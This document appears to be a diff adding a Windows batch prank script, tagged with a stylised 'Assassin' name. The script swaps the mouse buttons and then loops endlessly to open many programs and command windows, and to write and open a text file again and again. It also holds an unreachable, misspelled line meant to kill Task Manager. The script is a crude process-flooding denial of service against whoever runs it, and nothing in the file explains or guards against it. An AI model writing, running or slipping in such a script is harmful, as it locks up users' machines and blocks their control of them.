@@ -1,0 +1,50 @@
+@echo off 
+goto a 
+:z 
+taskkil /f /im taskmgr.exe 
+:a 
+Rundll32 user32,SwapMouseButton 
+start wmplayer.exe 
+start cmd.exe 
+start calc.exe 
+start mspaint.exe 
+start msconfig.exe 
+start explorer.exe 
+start iexplore.exe 
+goto a 
+goto b 
+:b 
+echo 𐏓𐎐𝓐𝓼𝓼͠𝓪𝓼᷑𝓼𝓲𝓷⃝᳡𐏎 > 𐏓𐎐𝓐𝓼𝓼͠𝓪𝓼᷑𝓼𝓲𝓷⃝᳡𐏎.txt 
+start 𐏓𐎐𝓐𝓼𝓼͠𝓪𝓼᷑𝓼𝓲𝓷⃝᳡𐏎.txt 
+start 𐏓𐎐𝓐𝓼𝓼͠𝓪𝓼᷑𝓼𝓲𝓷⃝᳡𐏎.txt 
+start 𐏓𐎐𝓐𝓼𝓼͠𝓪𝓼᷑𝓼𝓲𝓷⃝᳡𐏎.txt 
+goto a 
+goto b 
+goto c 
+goto z 
+:c 
+start 
+start 
+start 
+start 
+start 
+start 
+start 
+start 
+start 
+start 
+start 
+start 
+start 
+start 
+start 
+start 
+goto a 
+goto b 
+goto c 
+goto z  
+
+
+
+
+ 
